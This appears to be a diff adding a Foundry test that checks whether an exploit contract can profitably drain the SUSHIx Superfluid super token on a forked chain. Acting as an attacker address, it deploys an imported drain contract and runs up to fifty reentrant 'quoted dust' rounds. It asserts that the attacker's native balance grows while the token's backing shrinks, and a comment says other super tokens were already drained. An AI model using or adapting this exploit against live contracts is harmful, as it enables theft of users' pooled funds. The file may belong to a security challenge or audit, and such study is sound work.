@@ -1,0 +1,60 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+import {Ch5ERC20Drain} from "../exploit/Run.s.sol";
+
+interface IERC20View61 {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface ISuperTokenView61 {
+    function getUnderlyingToken() external view returns (address);
+}
+
+/// @notice Current-head validation for the omitted SUSHIx continuation branch.
+/// @dev The main exploit already drained MATICx/USDCx/DAIx/ETHx/WBTCx. This
+///      probe checks whether the remaining SUSHIx backing is still profitable
+///      through the same quoted one-round dust helper.
+contract Attempt61SUSHIxCurrentHeadQuotedDustTest is Test {
+    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
+    address internal constant SUSHIX = 0xDaB943C03f9e84795DC7BF51DdC71DaF0033382b;
+    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
+
+    uint256 internal constant STAGE_CAP = 5 ether;
+    uint256 internal constant MAX_REENTRY_COUNT = 50;
+    uint32 internal constant INDEX_BASE = 750_000_000;
+
+    function setUp() public {
+        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
+    }
+
+    function test_current_head_sushix_quoted_dust_increases_native_balance() public {
+        address underlying = ISuperTokenView61(SUSHIX).getUnderlyingToken();
+        uint256 nativeBefore = ATTACKER.balance;
+        uint256 backingBefore = IERC20View61(underlying).balanceOf(SUSHIX);
+
+        vm.startPrank(ATTACKER);
+        Ch5ERC20Drain drain = new Ch5ERC20Drain(SUSHIX, ROUTER, INDEX_BASE, address(0));
+        (uint256 bootstrapNative, uint256 roundsExecuted, uint256 nativeOut) =
+            drain.executeQuotedDust{value: STAGE_CAP}(MAX_REENTRY_COUNT);
+        vm.stopPrank();
+
+        uint256 nativeAfter = ATTACKER.balance;
+        uint256 backingAfter = IERC20View61(underlying).balanceOf(SUSHIX);
+
+        console.log("bootstrap native:", bootstrapNative);
+        console.log("rounds executed:", roundsExecuted);
+        console.log("native out:", nativeOut);
+        console.log("native before:", nativeBefore);
+        console.log("native after:", nativeAfter);
+        console.log("native delta:", nativeAfter - nativeBefore);
+        console.log("backing before:", backingBefore);
+        console.log("backing after:", backingAfter);
+
+        assertGt(bootstrapNative, 0, "bootstrap should be positive");
+        assertGt(roundsExecuted, 0, "no rounds executed");
+        assertGt(nativeAfter, nativeBefore, "quoted dust continuation should increase native balance");
+        assertLt(backingAfter, backingBefore, "backing should decrease");
+    }
+}
